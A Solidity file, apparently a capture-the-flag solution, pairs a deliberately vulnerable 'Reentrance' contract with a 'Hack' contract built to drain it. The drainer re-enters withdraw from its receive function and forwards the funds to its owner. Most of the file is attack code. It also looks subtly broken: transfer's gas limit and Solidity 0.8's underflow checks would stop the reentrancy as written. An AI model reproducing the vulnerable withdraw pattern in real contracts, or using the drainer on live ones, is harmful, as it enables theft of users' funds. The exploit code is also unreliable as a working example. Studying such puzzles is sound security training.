// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + (msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            payable(msg.sender).transfer(_amount);
            balances[msg.sender] -= _amount;
        }
    }


    receive() external payable {}
}
interface Ree {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}
contract Hack {
    Ree public _reecont;
    address public owner;
    constructor(address _ree) {
        _reecont = Ree(_ree);
        owner = msg.sender;
    }

    function attack() public payable {
        _reecont.donate{value: 0.001 ether}(address(this));
        _reecont.withdraw(0.001 ether);
    }
    function grab() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    receive() external payable {
        _reecont.withdraw(0.001 ether);
    }
}
